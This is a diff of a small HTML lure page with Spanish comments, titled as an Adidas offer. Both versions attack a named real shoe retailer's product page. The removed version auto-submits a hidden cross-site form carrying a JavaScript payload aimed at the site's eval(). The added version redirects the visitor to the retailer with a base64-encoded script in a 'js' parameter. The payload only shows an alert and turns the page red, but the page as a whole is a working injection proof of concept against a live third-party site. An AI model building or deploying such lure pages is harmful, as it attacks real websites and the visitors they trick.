@@ -1,16 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head><title>Oferta Exclusiva</title></head>
+<head><title>Oferta Adidas</title></head>
 <body>
-    <h1>Redirigiendo a la oferta...</h1>
-    
-    <form id="exploit" action="https://maszapatillas.com/es/zapatillas-mujer/47194-143055-zapatillas-adidas-spezial-.html?action=shopperPrices" method="POST" enctype="text/plain">
-        <input type="hidden" name='[{"id":"151056","js":"alert(\"XSS CRITICO: Vulnerabilidad confirmada en eval()\"); document.body.style.background=\"red\";"}]' value=''>
-    </form>
-
     <script>
-        // Se envía solo al cargar la página
-        document.getElementById('exploit').submit();
+        // Intentamos inyectar el código a través de un parámetro que la web lea
+        const payload = "alert('VULNERABILIDAD CRITICA: eval() detectado'); document.body.style.backgroundColor='red';";
+        const urlVulnerable = "https://maszapatillas.com/es/zapatillas-mujer/47194-143055-zapatillas-adidas-spezial-.html?js=" + btoa(payload);
+        
+        window.location.href = urlVulnerable;
     </script>
 </body>
 </html>
